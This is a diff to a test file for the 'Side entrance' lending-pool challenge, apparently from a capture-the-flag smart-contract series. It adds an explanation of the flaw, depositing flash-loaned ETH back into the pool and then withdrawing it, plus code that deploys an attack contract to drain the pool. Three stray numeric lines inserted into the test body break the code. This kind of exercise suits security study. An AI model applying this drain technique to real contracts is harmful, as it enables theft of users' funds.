@@ -6,7 +6,9 @@ describe('[Challenge] Side entrance', function () {
     let deployer, attacker;
 
     const ETHER_IN_POOL = ethers.utils.parseEther('1000');
-
+    10000000000000000000000
+    9999999440869285704406
+    1000000000000000000000
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
@@ -25,6 +27,15 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /** WHATS WRONG?
+         * @notice The lender contract actually lend some ETH for someone to use
+         * the core problem here is the contract have a deposit function and withdraw function
+         * withdraw need to an address deposit first, so what if we deposited our ETH form loan?
+         */
+        const AttackFactory = await ethers.getContractFactory("SideEntranceAttack",attacker);
+        this.attackContract = await AttackFactory.deploy(this.pool.address);
+        await this.attackContract.attack(ETHER_IN_POOL,attacker.address);
+
     });
 
     after(async function () {
